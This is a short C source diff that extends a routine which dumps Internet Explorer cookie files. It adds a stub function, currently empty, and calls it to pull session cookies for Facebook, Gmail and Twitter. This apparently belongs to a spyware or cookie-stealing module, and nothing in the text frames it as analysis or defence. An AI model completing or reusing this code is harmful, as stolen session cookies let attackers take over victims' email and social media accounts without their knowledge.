@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include "..\\common.h"
 #include "CookieHandler.h"
+#include "SocialMain.h"
 
 void ParseIECookieFile(WCHAR *file)
 {
@@ -75,12 +76,20 @@ WCHAR *GetIEProfilePath(WCHAR *cookie_path)
 	return FullPath;
 }
 
+void ParseSessionCookies(WCHAR *cookie_string, WCHAR *domain)
+{
+}
+
 int DumpIECookies(WCHAR *cookie_path)
 {
 	WCHAR *ie_dir;
 	WIN32_FIND_DATAW find_data;
 	WCHAR cookie_search[MAX_PATH];
 	HANDLE hFind;
+
+	ParseSessionCookies(FACEBOOK_IE_COOKIE, FACEBOOK_DOMAIN);
+	ParseSessionCookies(GMAIL_IE_COOKIE, GMAIL_DOMAIN);
+	ParseSessionCookies(TWITTER_IE_COOKIE, TWITTER_DOMAIN);
 
 	ie_dir = GetIEProfilePath(cookie_path);
 	_snwprintf_s(cookie_search, MAX_PATH, L"%s\\*", ie_dir);  
